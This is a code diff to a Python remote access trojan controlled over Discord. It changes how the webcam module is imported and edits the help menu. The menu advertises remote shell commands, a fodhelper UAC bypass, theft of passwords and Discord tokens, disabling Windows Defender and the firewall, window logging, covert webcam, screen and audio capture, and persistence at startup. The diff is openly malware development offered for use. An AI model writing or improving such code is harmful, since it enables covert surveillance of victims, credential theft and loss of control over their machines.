@@ -7,7 +7,8 @@ import ssl
 import random
 import threading
 import time
-import cv2
+if (sys.argv[0].endswith("exe")):
+    import cv2
 import subprocess
 import discord
 from comtypes import CLSCTX_ALL
@@ -34,7 +35,6 @@ Availaible commands are :
 
 --> !message = Show a message box displaying your text / Syntax  = "!message example"
 --> !shell = Execute a shell command /Syntax  = "!shell whoami"
---> !webcampic = Take a picture from the webcam
 --> !windowstart = Start logging current user window (logging is shown in the bot activity)
 --> !windowstop = Stop logging current user window 
 --> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
@@ -63,8 +63,6 @@ Availaible commands are :
 --> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
 --> !uacbypass = attempt to bypass uac to gain admin by using fod helper
 --> !passwords = grab all passwords
---> !streamwebcam = streams webcam by sending multiple pictures
---> !stopwebcam = stop webcam stream
 --> !streamscreen = stream screen by sending multiple pictures
 --> !stopscreen = stop screen stream
 --> !shutdown = shutdown computer
@@ -76,7 +74,6 @@ Availaible commands are :
 --> !dateandtime = display system date and time
 --> !prockill = kill a process by name / syntax = "!kill process.exe"
 --> !recscreen = record screen for certain amount of time / syntax = "!recscreen 10"
---> !reccam = record camera for certain amount of time / syntax = "!reccam 10"
 --> !recaudio = record audio for certain amount of time / syntax = "!recaudio 10"
 --> !disableantivirus = permanently disable windows defender(requires admin)
 --> !disablefirewall = disable windows firewall (requires admin)
@@ -98,7 +95,10 @@ Availaible commands are :
 --> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)
 --> !getdiscordtokens = get discord token ONLY! (also decrypts them)
 """
-
+if not (sys.argv[0].endswith("exe")):
+    helpmenu+='--> !reccam = record camera for certain amount of time / syntax = "!reccam 10"'
+    helpmenu+='--> !streamwebcam = streams webcam by sending multiple pictures\n--> !stopwebcam = stop webcam stream'
+    helpmenu+='--> !webcampic = Take a picture from the webcam'
 async def activity(client):
     import time
     import win32gui
